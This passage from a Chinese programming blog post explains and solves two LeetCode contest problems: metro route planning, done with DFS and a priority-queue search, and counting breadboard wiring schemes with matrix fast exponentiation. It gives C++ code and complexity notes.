<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">analysisHistogram</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; heights, <span class="type">int</span> cnt)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(heights.<span class="built_in">begin</span>(),heights.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="type">int</span> mindiff = INT_MAX;</span><br><span class="line">        <span class="type">int</span> n = heights.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> idx = <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n-cnt; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(heights[i+cnt<span class="number">-1</span>] - heights[i] &lt; mindiff)&#123;</span><br><span class="line">                idx = i;</span><br><span class="line">                mindiff = heights[i+cnt<span class="number">-1</span>] - heights[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = idx; i &lt; idx+cnt; ++i)&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(heights[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="建信03-地铁路线规划"><a href="#建信03-地铁路线规划" class="headerlink" title="建信03. 地铁路线规划"></a>建信03. 地铁路线规划</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>某城市有若干条地铁线路，<code>lines</code> 记录了每条地铁线路依次停靠的站点（每条线路均是双向的）<br>李林想从站点 <code>start</code> 出发前往 <code>end</code>，请规划一条可行路线使得他可以以最小的换乘次数到达目的站点。若有多条路线满足要求，请返回字典序最小的路线（要求路线上无重复的站点）。</p>
<p>注意：</p>
<ul>
<li>输入数据保证存在 <code>start</code> 到 <code>end</code> 的路线</li>
<li>任意路线上的点在该条路线上仅出现一次（即任意一条路线均不是环线）</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：lines = [[1,2,3,4,5],[2,10,14,15,16],[10,8,12,13],[7,8,4,9,11]], start = 1, end = 7</span><br><span class="line"></span><br><span class="line">输出：[1,2,3,4,8,7]</span><br><span class="line"></span><br><span class="line">解释：路线如图所示</span><br><span class="line">从站点 1 到站点 7 的最少换乘 1 次，路线为 [1,2,3,4,8,7]</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：lines = [[1,2,3,4,5,6,7,8,9,10,11],[12,13,2,14,8,15],[16,1,17,10,18]], start = 9, end = 1</span><br><span class="line"></span><br><span class="line">输出：[9,8,7,6,5,4,3,2,1]</span><br><span class="line"></span><br><span class="line">解释：路线如图所示</span><br><span class="line">从站点 9 到站点 1 的最少换乘 0 次，路线为 [9,8,7,6,5,4,3,2,1]</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= lines.length, lines[i].length &lt;= 100</code></li>
<li><code>1 &lt;= lines[i][j], start, end &lt;= 10000</code></li>
</ul>
<h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/ccbft-2021fall/problems/zQTFs4/">https://leetcode-cn.com/contest/ccbft-2021fall/problems/zQTFs4/</a></p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> dijistra 或者　DFS</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>感觉这个题目当时拿到时确实没有特别好的思路, 感觉可以通过暴力搜索即可解决该题目，最后看到几个解答，发现有直接 $DFS$ 加减枝就可以搞定的. 其实想想这个题目最难的地方有两点需要注意:</li>
</ol>
<ul>
<li>字典序最小的路径如何求出,最后看了下别人的解法竟然都是直接记录下当前的路径,然后比较两个整数数组的字典序大小即可，当初拿到题目的时候一直在想如何记录最小的字典序，结果都是使用暴力来记录．</li>
<li>如何记录两个站点之间的线路切换，我们在遍历的时候需要记录上一站的站点 $x$ 和路线 $y$，在下一站点切换时，我们会遍历站点 $x$ 周围所有的站点和路线, 这个需要稍微用点技巧, 我们在记录站点的邻接站点时,同时记录下它的站点号和路线号.</li>
</ul>
<ol start="2">
<li>$DFS$ 暴力搜索的解法就感觉比较简单, 利用回溯记录下所有从 $start$ 可能的路径,并同时记录该路径经历的换乘次数, 同时记录下路径用来比较字典序,感觉这个解法确实没有什么难度,但是感觉复杂度还挺高的,感觉需要用到欧拉拓扑之类的，这个解法的时间复杂度应该挺高的，感觉应该在 $O(n^{3})$.当时感觉应该用 $BFS$ 来解决的,但是确实没有想到 $BFS$ 解决的好办法.</li>
<li>$BFS$: 我们可以使用 $dijistra$ 算法快速收敛,每次记录下当前路线的换站次数，路线号，已经经过的站点路劲，每次选择下一跳时，我们优先选择切换站点次数最少，且路径字典序最小的路径．实际 $BFS$ 写起来非常简洁.</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度为 $O(MN\times log(MN))$,其中 $N$ 为站点的个数, $M$ 为线路的个数.</li>
<li>空间复杂度为 $O(N^2)$,其中 $N$ 为站点的个数.</li>
</ul>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><ul>
<li><code>DFS</code>:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> ans = INT_MAX;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; ret;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> cur, <span class="type">int</span> target, vector&lt;vector&lt; pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt;&gt;&amp; g, vector&lt;<span class="type">bool</span>&gt;&amp; vis, <span class="type">int</span> last, <span class="type">int</span> cost, vector&lt;<span class="type">int</span>&gt;&amp; path)</span> </span>&#123;</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span>(cost &gt; ans) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(cur == target) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cost &lt; ans || (cost == ans &amp;&amp; path &lt; ret)) &#123;</span><br><span class="line">                ans = cost;</span><br><span class="line">                ret = path;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; [next, route] : g[cur]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[next]) &#123;</span><br><span class="line">                vis[next] = <span class="literal">true</span>;</span><br><span class="line">                path.<span class="built_in">push_back</span>(next);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(route != last) &#123;</span><br><span class="line">                    <span class="built_in">dfs</span>(next, target, g, vis, route, cost + <span class="number">1</span>, path);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">dfs</span>(next, target, g, vis, route, cost, path);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                path.<span class="built_in">pop_back</span>();</span><br><span class="line">                vis[next] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">metroRouteDesignI</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; a, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = a.<span class="built_in">size</span>(); <span class="comment">// 路线个数</span></span><br><span class="line">        </span><br><span class="line">        vector&lt;vector&lt; pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt;&gt; <span class="built_in">g</span>(<span class="number">10005</span>); <span class="comment">// 邻接表</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> m = a[i].<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j &lt; m - <span class="number">1</span>) &#123;</span><br><span class="line">                    g[a[i][j]].<span class="built_in">push_back</span>(&#123;a[i][j + <span class="number">1</span>], i&#125;);</span><br><span class="line">                    g[a[i][j + <span class="number">1</span>]].<span class="built_in">push_back</span>(&#123;a[i][j], i&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">vis</span><span class="params">(<span class="number">10005</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">        </span><br><span class="line">        path.<span class="built_in">push_back</span>(start);</span><br><span class="line">        vis[start] = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 深搜</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [next, route] : g[start]) &#123;</span><br><span class="line">            vis[next] = <span class="literal">true</span>;</span><br><span class="line">            path.<span class="built_in">push_back</span>(next);</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">dfs</span>(next, end, g, vis, route, <span class="number">0</span>, path);</span><br><span class="line">            </span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            vis[next] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li><code>BFS</code>:</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> line;</span><br><span class="line">    <span class="type">int</span> change;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span>&#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> Node &amp; a, <span class="type">const</span> Node &amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a.change == b.change)&#123;</span><br><span class="line">            <span class="keyword">return</span> a.path &gt; b.path;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a.change &gt; b.change;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:    </span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">metroRouteDesignI</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; lines, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = lines.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        </span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;&gt; nodes;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,vector&lt;pii&gt;&gt; graph;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> v : lines[i])&#123;</span><br><span class="line">                nodes[v].<span class="built_in">emplace_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; lines[i].<span class="built_in">size</span>(); ++j)&#123;</span><br><span class="line">                graph[lines[i][j<span class="number">-1</span>]].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(i,lines[i][j]));</span><br><span class="line">                graph[lines[i][j]].<span class="built_in">push_back</span>(<span class="built_in">make_pair</span>(i,lines[i][j<span class="number">-1</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        priority_queue&lt;Node,vector&lt;Node&gt;,cmp&gt; pq;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nodes[start])&#123;</span><br><span class="line">            Node t;</span><br><span class="line">            t.line = v;</span><br><span class="line">            t.change = <span class="number">0</span>;</span><br><span class="line">            t.path.<span class="built_in">emplace_back</span>(start);</span><br><span class="line">            pq.<span class="built_in">push</span>(t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!pq.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            Node curr = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(curr.path.<span class="built_in">back</span>() == end)&#123;</span><br><span class="line">                <span class="keyword">return</span> curr.path;</span><br><span class="line">            &#125;</span><br><span class="line">            unordered_set&lt;<span class="type">int</span>&gt; visited;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> v : curr.path)&#123;</span><br><span class="line">                visited.<span class="built_in">insert</span>(v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> neg : graph[curr.path.<span class="built_in">back</span>()])&#123;</span><br><span class="line">                <span class="keyword">if</span>(visited.<span class="built_in">count</span>(neg.second)) <span class="keyword">continue</span>;</span><br><span class="line">                Node next;</span><br><span class="line">                next.line = neg.first;</span><br><span class="line">                next.path = curr.path;</span><br><span class="line">                next.path.<span class="built_in">emplace_back</span>(neg.second);</span><br><span class="line">                <span class="comment">//change line*/</span></span><br><span class="line">                <span class="keyword">if</span>(neg.first != curr.line)&#123;</span><br><span class="line">                    next.change = curr.change + <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123; <span class="comment">// the same line</span></span><br><span class="line">                    next.change = curr.change;</span><br><span class="line">                &#125;</span><br><span class="line">                pq.<span class="built_in">push</span>(next);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="建信04-电学实验课"><a href="#建信04-电学实验课" class="headerlink" title="建信04. 电学实验课"></a>建信04. 电学实验课</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>某电学实验使用了 <code>row * col</code> 个插孔的面包板，可视作二维矩阵，左上角记作 <code>(0,0)</code>。老师设置了若干「目标插孔」，它们位置对应的矩阵下标记于二维数组 <code>position</code>。实验目标要求同学们用导线连接所有「目标插孔」，即从任意一个「目标插孔」沿导线可以到达其他任意「目标插孔」。受实验导线长度所限，导线的连接规则如下：</p>
<ul>
<li>一条导线可连接相邻两列的且行间距不超过 1 的两个插孔</li>
<li>每一列插孔中最多使用其中一个插孔（包括「目标插孔」）<br>若实验目标可达成，请返回使用导线数量最少的连接所有目标插孔的方案数；否则请返回 0。</li>
</ul>
<p>注意：</p>
<ul>
<li>输入数据保证每列最多仅有一个「目标插孔」；</li>
<li>答案需要以 <code>1e9 + 7 (1000000007)</code> 为底取模， 如：计算初始结果为：<code>1000000008</code>，请返回 <code>1</code><br>示例 1：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：row = 5, col = 6, position = [[1,3],[3,2],[4,1]]</span><br><span class="line"></span><br><span class="line">输出：0</span><br><span class="line"></span><br><span class="line">解释：根据连接规则无法达成实验目标。</span><br></pre></td></tr></table></figure>
示例 2：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：row = 3，col = 4, position = [[0,3],[2,0]]</span><br><span class="line"></span><br><span class="line">输出：3</span><br><span class="line"></span><br><span class="line">解释：根据连接规则共有三种方案达成目标。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：row = 5, col = 6, position = [[1,3],[3,5],[2,0]]</span><br><span class="line"></span><br><span class="line">输出：6</span><br><span class="line"></span><br><span class="line">解释：根据连接规则共有六种方案达成目标。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= row &lt;= 20</code></li>
<li><code>3 &lt;= col &lt;= 10^9</code></li>
<li><code>1 &lt; position.length &lt;= 1000</code></li>
<li><code>0 &lt;= position[i][0] &lt; row</code></li>
<li><code>0 &lt;= position[i][1] &lt; col</code></li>
</ul>
<h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/ccbft-2021fall/problems/lSjqMF/">https://leetcode-cn.com/contest/ccbft-2021fall/problems/lSjqMF/</a></p>
<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 动态规划 + 数学问题　</p>
</blockquote>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>这个题目,我非常喜欢的类型, 用数学方法解决类似于动态规划的题目，与<a href="https://leetcode-cn.com/problems/fibonacci-number/">509. 斐波那契数</a>的数学解法非常相似．我们知道斐波那契数数列的递推关系为$f[i] &#x3D; f[i-1] + f[i-2]$, 然后我们可以利用利用矩阵乘法,求解公式如下:<br>$$<br>[f(n+1),f(n)] &#x3D; [f(n) + f(n-1), f(n)] \<br>&#x3D; [f(n),f(n-1)] \times<br>\left[<br>\begin{array}{l}<br>1 &amp; 1 \<br>1 &amp; 0 \<br>\end{array}<br>\right]<br>$$</li>
<li>首先在本题中我们需要分析一下, 每个目标插孔连接时一定是按照列的大小依次进行相连的, 因为题目的约束规则是一条导线可连接相邻两列的且行间距不超过 1 的两个插孔且每一列插孔中最多使用其中一个插孔,这就意味着我们不可能先连接列数较大的目标孔后,再来连接列数较小的目标控. 因此首先我们需要按照列数的大小对目标孔进行排序, 然后依次按照列数大小开始连接.</li>
<li>我们知道对于递推关系如下,设$f[i][j]$ 表示第 $i$ 行 $j$ 列的导线的穿线数目，则我们可以知道:<br>$$<br>f[i][j] &#x3D; f[i-1][j-1] + f[i][j-1] + f[i+1][j-1]<br>$$<br>我们可以归纳递推关系为:<br>$$<br>\left{<br>\begin{array}{lr}<br>f[0][j] &#x3D; f[0][j-1] + f[1][j-1]\<br>f[1][j] &#x3D; f[0][j-1] + f[1][j-1] + f[2][j-1]\<br>\cdots \<br>f[n-2][j] &#x3D; f[n-3][j-1] + f[n-2][j-1] + f[n-1][j-1]\<br>f[n-1][j] &#x3D; f[n-2][j-1] + f[n-1][j-1]\<br>\end{array}<br>\right.<br>$$<br>转换为矩阵乘法即为:<br>$$<br>[f[0][j], f[1][j], \cdots,f[n-2][j],f[n-1][j]] &#x3D; \<br>[f[0][j-1], f[1][j-1], \cdots,f[n-2][j-1],f[n-1][j-1]] \times<br>\left[<br>\begin{array}{lr}<br>1 &amp; 1 &amp; 0 &amp; \cdots 0 &amp; 0 \<br>1 &amp; 1 &amp; 1 &amp; \cdots 0 &amp; 0 \<br>0 &amp; 1 &amp; 1 &amp; \cdots 0 &amp; 0 \<br>0 &amp; 0 &amp; 1 &amp; \cdots 0 &amp; 0 \<br>0 &amp; 0 &amp; 0 &amp; \cdots 0 &amp; 0 \<br>\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \<br>0 &amp; 0 &amp; 0 &amp; \cdots 1 &amp; 0 \<br>0 &amp; 0 &amp; 0 &amp; \cdots 1 &amp; 1 \<br>0 &amp; 0 &amp; 0 &amp; \cdots 1 &amp; 1 \<br>\end{array}<br>\right]<br>$$<br>我们设矩阵 $A$ 满足:<br>$$<br>A &#x3D;<br>\left[<br>\begin{array}{lr}<br>1 &amp; 1 &amp; 0 &amp; \cdots 0 &amp; 0 \<br>1 &amp; 1 &amp; 1 &amp; \cdots 0 &amp; 0 \<br>0 &amp; 1 &amp; 1 &amp; \cdots 0 &amp; 0 \<br>0 &amp; 0 &amp; 1 &amp; \cdots 0 &amp; 0 \<br>0 &amp; 0 &amp; 0 &amp; \cdots 0 &amp; 0 \<br>\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \<br>0 &amp; 0 &amp; 0 &amp; \cdots 1 &amp; 0 \<br>0 &amp; 0 &amp; 0 &amp; \cdots 1 &amp; 1 \<br>0 &amp; 0 &amp; 0 &amp; \cdots 1 &amp; 1 \<br>\end{array}<br>\right]<br>$$<br>则此时我们可以知道对于第 $i$ 列的元素设为矩阵 $f[j]$, 对于第 $j$ 列的方法数的元素为矩阵 $f[i]$, 我们假设 $ i \le j$, 则我们可以知道递推关系为:<br>$$<br>f[j] &#x3D; f[i]\times A^{j-i}<br>$$<br>此时我们则将方法数的计算转换为矩阵的乘法运算, 我们只需要每次求出第到达 $i$ 列的目标控的方法数，然后根据矩阵的乘法可以计算出处在第 $j$ 列的目标孔的方法数.</li>
<li>实际计算过程中,我们还需要利用快速幂法,快速的计算出矩阵的 $n$ 次幂.　我们可以进行预处离．</li>
<li>复杂度分析:</li>
</ol>
<ul>
<li>时间复杂度分析: $O(C\times n \times row^{3}$, 其中 $n$ 为点的个数, $C &#x3D; 32$, $row$ 为矩阵的行数.</li>
<li>空间复杂度分析: $O(C\times row \times col)$,其中 $C&#x3D;32$.</li>
</ul>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><ul>
<li>数学问题<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;ll&gt;&gt; <span class="built_in">mult</span>(vector&lt;vector&lt;ll&gt;&gt; mat1, vector&lt;vector&lt;ll&gt;&gt; mat2, <span class="type">long</span> <span class="type">long</span> mod)&#123;</span><br><span class="line">        <span class="type">int</span> m = mat1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> col = mat1[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = mat2[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;ll&gt;&gt; <span class="built_in">res</span>(m,<span class="built_in">vector</span>&lt;ll&gt;(n));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; col; ++k)&#123;</span><br><span class="line">                    res[i][j] = (res[i][j] + mat1[i][k]*mat2[k][j])%mod;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vector&lt;vector&lt;ll&gt;&gt; <span class="built_in">fastpow</span>(vector&lt;vector&lt;ll&gt;&gt; &amp; mat, <span class="type">int</span> p, <span class="type">long</span> <span class="type">long</span> mod)&#123;</span><br><span class="line">        <span class="type">int</span> m = mat.<span class="built_in">size</span>();</span><br><span class="line">        </span><br><span class="line">        vector&lt;vector&lt;ll&gt;&gt; <span class="built_in">res</span>(m,<span class="built_in">vector</span>&lt;ll&gt;(m));</span><br><span class="line">        vector&lt;vector&lt;ll&gt;&gt; curr = mat;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            res[i][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(; p != <span class="number">0</span>; p = (p&gt;&gt;<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(p%<span class="number">2</span>)&#123;</span><br><span class="line">                res = <span class="built_in">mult</span>(res,curr,mod);</span><br><span class="line">            &#125;</span><br><span class="line">            curr = <span class="built_in">mult</span>(curr,curr,mod);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">electricityExperiment</span><span class="params">(<span class="type">int</span> row, <span class="type">int</span> col, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; position)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = position.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="built_in">sort</span>(position.<span class="built_in">begin</span>(),position.<span class="built_in">end</span>(),[&amp;](<span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp; a,<span class="type">const</span> vector&lt;<span class="type">int</span>&gt; &amp; b)&#123;</span><br><span class="line">           <span class="keyword">return</span> a[<span class="number">1</span>] &lt; b[<span class="number">1</span>]; </span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        vector&lt;vector&lt;ll&gt;&gt; <span class="built_in">mat</span>(row,<span class="built_in">vector</span>&lt;ll&gt;(row));</span><br><span class="line">        vector&lt;vector&lt;vector&lt;ll&gt;&gt;&gt; <span class="built_in">arr</span>(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            mat[i][i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= <span class="number">1</span>) mat[i][i<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(i+<span class="number">1</span> &lt; row) mat[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        arr[<span class="number">0</span>] = mat;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">31</span>; ++i)&#123;</span><br><span class="line">            arr[i] = <span class="built_in">mult</span>(arr[i<span class="number">-1</span>],arr[i<span class="number">-1</span>],mod);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;ll&gt;&gt; <span class="built_in">curr</span>(<span class="number">1</span>,<span class="built_in">vector</span>&lt;ll&gt;(row));</span><br><span class="line">        curr[<span class="number">0</span>][position[<span class="number">0</span>][<span class="number">0</span>]] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> p = position[i][<span class="number">1</span>] - position[i<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">31</span>; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p&amp;(<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                    curr = <span class="built_in">mult</span>(curr,arr[j],mod);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; row; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j != position[i][<span class="number">0</span>])&#123;</span><br><span class="line">                    curr[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> curr[<span class="number">0</span>][position[n<span class="number">-1</span>][<span class="number">0</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mike-box.github.io/">http://mike-box.github.io/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
